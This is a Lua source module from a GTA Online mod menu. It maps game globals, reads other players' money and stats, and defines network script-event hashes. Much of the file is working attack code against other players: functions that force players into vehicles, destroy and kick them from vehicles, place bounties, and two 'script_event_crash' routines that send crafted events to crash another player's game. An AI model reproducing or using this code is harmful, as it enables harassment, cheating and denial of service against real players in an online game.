-- Copyright © 2020-2022 Kektram

local globals <const> = {version = "1.4.1"}

local essentials <const> = require("Kek's Essentials")
local settings <const> = require("Kek's Settings")
local memoize <const> = require("Kek's Memoize")

local offsets <const> = essentials.const({
	["MAIN"] = 1853910,
	["OFFSET_PER_PLAYER"] = 862,
	["OFFSET_TO_INFO"] = 205
})

local stats <const> = essentials.const({
	["WALLET"] = 3,
	["RANK"] = 6,
	["CREW_TITLE"] = 7,
	["KD"] = 26,
	["KILLS"] = 28,
	["DEATHS"] = 29,
	["TOTALMONEY"] = 56,
	["FAVOURITE_WEAPON_HASH"] = 59,
	["TOTAL_RACES_WON"] = 15,
	["TOTAL_RACES_LOST"] = 16, 
	["TIMES_FINISH_RACE_TOP_3"] = 17, 
	["TIMES_FINISH_RACE_LAST"] = 18,
	["TIMES_RACE_BEST_LAP"] = 19,
	["TOTAL_DEATHMATCH_WON"] = 20,
	["TOTAL_DEATHMATCH_LOST"] = 21, 
	["TOTAL_TDEATHMATCH_WON"] = 22, 
	["TOTAL_TDEATHMATCH_LOST"] = 23,
	["TIMES_FINISH_DM_TOP_3"] = 30, 
	["TIMES_FINISH_DM_LAST"] = 31,
	["DARTS_TOTAL_WINS"] = 32, 
	["DARTS_TOTAL_MATCHES"] = 33,
	["ARMWRESTLING_TOTAL_WINS"] = 34, 
	["ARMWRESTLING_TOTAL_MATCH"] = 35,
	["TENNIS_MATCHES_WON"] = 36, 
	["TENNIS_MATCHES_LOST"] = 37,
	["BJ_WINS"] = 38,
	["BJ_LOST"] = 39,
	["GOLF_WINS"] = 40,
	["GOLF_LOSSES"] = 41,
	["SHOOTINGRANGE_WINS"] = 42, 
	["SHOOTINGRANGE_LOSSES"] = 43,
	["Unknown_stat"] = 44,
	["HORDEWINS"] = 47,
	["CRHORDE"] = 48,
	["MCMWIN"] = 45,
	["CRMISSION"] = 46,
	["MISSIONS_CREATED"] = 50, 
	["DROPOUTRATE"] = 27,
	["MOST_FAVORITE_STATION"] = 53,
	["CAN_SPECTATE"] = 52,
	-- Freemode script doesn't explicitly define these, but it seems highly likely they are correct.
	["IS_BAD_SPORT"] = 51,
	["GLOBALXP"] = 5
	-- Freemode script doesn't explicitly define these, but it seems highly likely they are correct.
})

function globals.get_player_info_offset(pid, info_offset)
	return offsets.MAIN + (1 + (pid * offsets.OFFSET_PER_PLAYER)) + offsets.OFFSET_TO_INFO + info_offset
end
function globals.get_player_info_i(pid, info_offset)
	return script.get_global_i(globals.get_player_info_offset(pid, info_offset))
end
function globals.get_player_info_f(pid, info_offset)
	return script.get_global_f(globals.get_player_info_offset(pid, info_offset))
end

function globals.get_player_rank(pid)
	return globals.get_player_info_i(pid, stats.RANK)
end

function globals.get_player_money(pid)
	return globals.get_player_info_i(pid, stats.TOTALMONEY)
end

function globals.get_player_wallet(pid)
	return globals.get_player_info_i(pid, stats.WALLET)
end

function globals.get_player_bank(pid)
	return globals.get_player_money(pid) - globals.get_player_wallet(pid)
end

function globals.get_player_kd(pid)
	return globals.get_player_info_f(pid, stats.KD)
end

function globals.get_player_kills(pid)
	return globals.get_player_info_i(pid, stats.KILLS)
end

function globals.get_player_deaths(pid)
	return globals.get_player_info_i(pid, stats.DEATHS)
end

globals.global_indices = essentials.const({
	time = 					2793046 + 4654, 	-- NETWORK::GET_NETWORK_TIME()

	transition = 			1574993, -- Is 66 if fully loaded into session

	current = 				1923597 + 9, 		-- Negative framecount * ((joaat(script host name) * cloud time) + random(0, 65534) + random(0, 65534))

	previous = 				1923597 + 10		-- Negative framecount * ((joaat(script host name) * cloud time) + random(0, 65534) + random(0, 65534))
})

globals.player_global_indices = essentials.const({
	personal_vehicle = 				{offset = 2672505 + 1 + 187, 		pid_multiplier = 1},

	generic = 						{offset = 1894573 + 1 + 510, 		pid_multiplier = 608}, 		-- Equivalent to global(1921036 + 9) if pid is script host

	organization_associate_hash = 	{offset = 1894573 + 1 + 10 + 2, 	pid_multiplier = 608},		-- Seems to be 1639791091 + (unknown * 3)

	organization_id = 				{offset = 1894573 + 1 + 10, 		pid_multiplier = 608},		-- Is -1 if no organization

	otr_status = 					{offset = 2657589 + 1 + 210, 		pid_multiplier = 466}, 		-- Returns 1 if player is otr

	bounty_status = 				{offset = 1835504 + 1 + 4,			pid_multiplier = 3}, 		-- Returns 1 if player has bounty.

	is_player_typing = 				{offset = 1653913 + 2 + 241 + 136 --[[+ ((16 // 32) * 33)--]], pid_multiplier = 1} -- < this > & 1 << 16 ~= 0 if they're typing.
})

local script_event_hashes <const> = essentials.const({
	["Force player into vehicle"] = 		891653640, -- Par 4 - 35 are network hashes. par 3 is how many of those hashes to check. par 2 & 36 are bools.

	["Infinite while loop crash"] = 		-992162568,

	["Disown personal vehicle"] = 			955408685,

	["Vehicle EMP"] =						-1167165474,

	["Destroy personal vehicle"] = 			-2101545224,

	["Kick out of vehicle"] = 				-1603050746,

	["Give OTR or ghost organization"] =	1141648445,

	["Block passive"] = 					547789403,

	["Send to Perico island"] = 			-369672308,

	["Apartment invite"] = 					-702866045,

	["Transaction error"] = 				54323524,

	["CEO money"] = 						75579707,

	["Bounty"] = 							1459520933,

	["Generic event"] = 					-1428749433,

	["Notifications"] = 					2041805809
})

globals.GENERIC_ARG_HASHES = essentials.const({ -- Includes all cases (switch statement) with something interesting
	clear_wanted = -137826962,
	move_camera = gameplay.get_hash_key("pats_horse_right") -- Removes godmode for a frame
}) -- THESE NEEDS TO GET UPDATED ON MAJOR GTA UPDATES

globals.NOTIFICATION_HASHES = essentials.const({
	cash_added_bank = 276906331,
	cash_stolen = 82080686,
	cash_removed = 853249803,
	vehicle_kill_list_will_explode_in_x = -1767294187
}) -- THESE NEEDS TO GET UPDATED ON MAJOR GTA UPDATES

globals.NOTIFICATION_HASHES_RAW = essentials.const({ -- THESE NEEDS TO GET UPDATED ON MAJOR GTA UPDATES
	452938553,
	-- -1469113216,
	-- 38886995,
	-- -1405712461,
	-- 590362137,
	-51629183,
	1831867170,
	-1896366254,
	-1769219339,
	-1201829147,
	-1517442370,
	133276031,
	747596633,
	1347638234,
	1440461450,
	-1885238681,
	-1674949541,
	276906331,
	82080686,
	853249803,
	-617191610,
	-545057654,
	2048922946,
	-1481848857,
	1654394662,
	-1770347024,
	-859396924,
	927356288,
	-1871245691,
	-1891585544,
	-1497171835,
	-91279174,
	323140324,
	156120852,
	-125529465,
	-- -578649573, Can cause player to get kicked
	-856002885,
	1866254059,
	1992879396,
	-506195839,
	536247389,
	40415436,
	693212712,
	-2072720249,
	-2023529582,
	-680281595,
	-162862366,
	1692486872,
	-46327943,
	1551613046,
	826814496,
	-206369507,
	215994989,
	-1767294187,
	1105683428,
	825274629,
	-1422778765,
	-1446638030,
	-437005646,
	1205553315,
	1715399868,
	1054826091,
	-171231893,
	905090366,
	-1492151242,
	crash_notification = 1466468442,
	-233807788,
	799644743,
	-767364034,
	1594775632,
	-946271051,
	-788575836,
	-1358816432,
	-1054388735,
	-264618765,
	-1221660330,
	-236682200,
	-239271415,
	-1364562129,
	-240186045,
	1313302519,
	1267118853,
	117293314,
	934722448,
	-1839517426,
	841444579,
	146109770,
	-427075079,
	-383917759,
	-1865943047,
	1151073857,
	-782545562,
	-607688663,
	-94996696,
	1992015606,
	858711231,
	1340945314,
	1660662958,
	1033324347,
	-1712231292,
	1532951285,
	1534835942,
	1417675950,
	-323581143,
	1435651751,
	445772363,
	-307630570,
	-811897066,
	-255033312,
	-1289092281,
	38143317,
	-1783618453,
	1624963287,
	1194877609,
	776020967,
	-1354982652,
	1883642286,
	-1649344278,
	674607575,
	-1045393704,
	230380648,
	809823027,
	-534374271,
	-1143278454,
	829500279,
	-817438578,
	-1175819830,
	1069804344,
	1853971215,
	1277940407,
	747436217,
	-322595501,
	1588666147,
	1086389994,
	-1036402456,
	-865648130,
	451971127,
	-1763559476,
	1377514326,
	-1388824359,
	-224985215,
	244034214,
	-368990008,
	-461851137,
	835963447,
	-2029707091,
	-919994634,
	-1017535732,
	-1780664096,
	-1055343339,
	-527208501,
	2021477031,
	-112973257,
	-1431844264,
	-429114273,
	-909938777,
	-1629549027,
	776366923,
	-1331596270,
	-1069537481,
	1459140562,
	1197543335,
	89553090,
	-1858635130,
	-2030849211,
	548541714,
	560275391,
	-1856120941,
	-1868161678,
	-904876187,
	-1492242492,
	1302312272,
	-80563138,
	1323981595,
	-1350471532,
	446019400,
	-1624737755,
	2082207978,
	1602147982,
	1554197302,
	-1744981281,
	1145256297,
	1140260160,
	-1775372182,
	-1306903600,
	891899079,
	1354665487,
	-2051461174,
	153865685,
	1713623606
})

function globals.get_script_event_hash(name)
	essentials.assert(script_event_hashes[name], "Failed to get hash from script name:", name)
	return script_event_hashes[name]
end

function globals.get_global(global_name)
	essentials.assert(globals.global_indices[global_name], "Invalid global name.", global_name)
	return script.get_global_i(globals.global_indices[global_name])
end

function globals.force_player_into_vehicle(pid, timeout) -- Creds to RulyPancake the 5th#1345 for logging this from stand menu
	local time <const> = utils.time_ms() + 15000
	while player.is_player_dead(pid) and player.is_player_valid(pid) and time > utils.time_ms() do
		system.yield(0)
	end
	local was_player_already_in_god <const> = player.is_player_god(pid)
	if not player.is_player_dead(pid) then
		globals.send_script_event(pid, "Force player into vehicle", nil, 1, 1, network.network_hash_from_player_handle(pid), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1)
		local time <const> = utils.time_ms() + (timeout or 15000)
		system.yield(was_player_already_in_god and 8000 or 6000)
		while not player.is_player_dead(pid) 
		and player.is_player_valid(pid)
		and ((not was_player_already_in_god and player.is_player_god(pid)) or not essentials.is_in_vehicle(pid))
		and time > utils.time_ms() do
			system.yield(0)
		end
	end
end

function globals.get_player_global(global_name, pid, get_index)
	essentials.assert(globals.player_global_indices[global_name], "Invalid player global name.", global_name)
	essentials.assert(pid >= 0 and pid <= 31, "Invalid pid.", global_name, pid) -- Invalid pids can cause access violation crash
	local pid_offset <const> = pid * globals.player_global_indices[global_name].pid_multiplier
	if get_index == true then
		return globals.player_global_indices[global_name].offset + pid_offset
	else
		return script.get_global_i(globals.player_global_indices[global_name].offset + pid_offset)
	end
end

globals.script_event_tracker = setmetatable({count = 0, id = 0}, {
	__index = {},
	__newindex = function(Table, index, value)
		if value ~= nil then
			Table.count = Table.count + 1
			Table.id = Table.id + 1
			getmetatable(Table).__index[Table.id] = value
		else
			getmetatable(Table).__index[index] = nil
			Table.count = Table.count - 1
		end
	end,
	__pairs = function(Table)
		return next, getmetatable(Table).__index
	end
})

do
	local empty_table <const> = essentials.const({})
	function globals.send_script_event(pid_or_bits, script_hash_name, properties, ...)
		-- Priority: Some script events like emp will not work if delayed too much. 12 se in one frame is far below the the dangerous threshold of 20.
		-- Can't yield: Like priority events, this can send if current count is under 12. This allows for most events of this kind to send immediately.
		-- You need to specify if it's bits by passing send_to_multiple_people to true in the properties table
		properties = properties or empty_table
		if (properties.send_to_multiple_people or player.is_player_valid(pid_or_bits))
		and (not properties.friend_condition or essentials.is_not_friend(pid_or_bits)) then
			repeat
				for i, time in pairs(globals.script_event_tracker) do
					if time < utils.time_ms() then
						globals.script_event_tracker[i] = nil
					end
				end
				if not properties.cant_yield 
				and (
					globals.script_event_tracker.count >= 10 
					and (not properties.priority or globals.script_event_tracker.count < 12)
				) then
					system.yield(0)
				end
			until properties.cant_yield 
			or (globals.script_event_tracker.count < 10 
			or (properties.priority and globals.script_event_tracker.count < 12))

			if (properties.send_to_multiple_people or player.is_player_valid(pid_or_bits)) and globals.script_event_tracker.count < 12 then
				globals.script_event_tracker[true] = utils.time_ms() + math.ceil(2000 * gameplay.get_frame_time())
				for i = 1, select("#", ...) do -- Passing floats to script events doesn't work like you'd think.
					essentials.assert(math.type(select(i, ...)) == "integer", "Tried to pass a non-integer value as arguments to script event.", script_hash_name, player.player_id(), ...)
				end
				script.trigger_script_event_2(
					properties.send_to_multiple_people and pid_or_bits or 1 << pid_or_bits, 
					globals.get_script_event_hash(script_hash_name), 
					player.player_id(), ...
				)
				return true
			end
		elseif not properties.cant_yield then
			system.yield(0)
		end
		return false
	end
end

function globals.is_fully_transitioned_into_session()
	return globals.get_global("transition") == 66 or player.is_player_control_on(player.player_id()) -- For some people, the global doesn't return 66 while in singleplayer.
end

function globals.set_bounty(...)
	local script_target <const>,
	friend_relevant <const>,
	anonymous,
	amount = ...
	if player.player_count() > 0
	and globals.get_player_global("bounty_status", script_target) == 0
	and player.is_player_valid(script_target) 
	and player.is_player_playing(script_target) 
	and (not friend_relevant or essentials.is_not_friend(script_target)) then
		amount = amount or math.tointeger(settings.in_use["Bounty amount"]) or 10000
		local bits = 0
		for pid in essentials.players(true) do
			bits = bits | 1 << pid
		end
		globals.send_script_event(
			bits, 
			"Bounty",
			{send_to_multiple_people = true},
			script_target, 
			3, 
			amount >= 0 and amount or 10000, 
			1,
			anonymous and 1 or 0, 
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 
			globals.get_global("current"), globals.get_global("previous")
			
		)
	end
end

function globals.disable_vehicle(...)
	local pid <const>, friend_condition <const> = ...
	if memoize.get_player_coords(pid).z == -50 or player.is_player_in_any_vehicle(pid) then
		globals.send_script_event(pid, "Destroy personal vehicle", {friend_condition = friend_condition}, pid)
		globals.send_script_event(pid, "Kick out of vehicle", {friend_condition = friend_condition}, 0, 0, 0, 0, 1, pid, math.min(2147483647, gameplay.get_frame_count()))
	end
end

function globals.script_event_crash(...)
	local pid <const> = ...
	if player.is_player_valid(pid) and player.player_id() ~= pid then
		globals.send_script_event(pid, "Force player into vehicle", nil, 1, math.random(2000000000, 2147483647)) -- Crash due to 2 billion+ iterations in a for loop
		globals.send_script_event(pid, "Infinite while loop crash", nil, 0, math.random(2000000000, 2147483647)) -- Crash due to 2 billion+ iterations in a for loop
	end
end

function globals.script_event_crash_2(...) -- Has been unstable in the past, might crash your game. Yet to crash myself with it.
	local pid <const> = ...
	for i = 1, 25 do
		local rand_pid <const> = essentials.get_random_player_except({[player.player_id()] = true})
		script.trigger_script_event_2(1 << pid, globals.get_script_event_hash("Notifications"), 
			player.player_id(), 
			globals.NOTIFICATION_HASHES_RAW.crash_notification, 
			math.random(-2147483647, 2147483647),
			1, 0, 0, 0, 0, 0, pid, 
			player.player_id(), 
			rand_pid, 
			essentials.get_random_player_except({[player.player_id()] = true, [rand_pid] = true})
		)
	end
end

return globals